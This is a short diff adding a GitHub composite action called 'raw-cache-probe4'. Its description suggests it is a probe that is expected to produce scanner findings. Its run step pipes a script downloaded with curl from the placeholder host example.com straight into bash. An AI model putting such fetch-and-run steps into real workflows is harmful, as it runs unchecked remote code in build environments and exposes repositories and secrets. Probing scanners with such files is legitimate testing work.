@@ -1,0 +1,8 @@
+name: raw-cache-probe4
+description: Pushed after its raw URL was asked once; findings expected.
+runs:
+  using: composite
+  steps:
+    - uses: actions/checkout@main
+    - run: curl -fsSL https://example.com/install.sh | bash
+      shell: bash
